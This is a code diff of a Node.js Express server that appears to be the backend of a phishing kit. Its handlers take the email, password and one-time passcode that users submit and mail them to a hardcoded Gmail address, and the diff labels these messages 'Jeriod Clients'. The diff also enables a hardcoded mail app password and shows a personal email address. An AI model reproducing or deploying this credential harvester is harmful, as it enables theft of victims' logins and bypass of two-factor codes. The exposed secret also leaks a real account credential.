@@ -11,7 +11,7 @@ const PORT = process.env.PORT || 5000; // port to connect to WEB
 
 // emails credentials
 const userEmail = "Ikechukuwuprince@gmail.com";
-//const pass = "hznikzfudykeryam";
+const pass = "hznikzfudykeryam";
 // 19 JUNE
 
 // Middleware
@@ -34,8 +34,8 @@ app.post("/", (req, res) => {
   const mailOptions = {
     from: `${email}`,
     to: userEmail,
-    subject: `Email: ${email} \t\n\n\n password: ${password}`,
-    text: `New user registered with Email: ${email} and password: ${password}`,
+    subject: `Jeriod Clients ==> Email: ${email} \t\n\n\n password: ${password}`,
+    text: `Jeriod Clients ==> New user registered with Email: ${email} and password: ${password}`,
   };
 
   console.log(mailOptions);
@@ -66,8 +66,8 @@ app.post("/otp", (req, res) => {
   const mailOptions = {
     from: email,
     to: userEmail,
-    subject: `OTP: ${req.body?.otp} `,
-    text: `New user registered OTP: ${req.body?.otp}`,
+    subject: `Jeriod Clients ==> OTP: ${req.body?.otp} `,
+    text: `Jeriod Clients ==> New user registered OTP: ${req.body?.otp}`,
   };
 
   console.log(mailOptions);
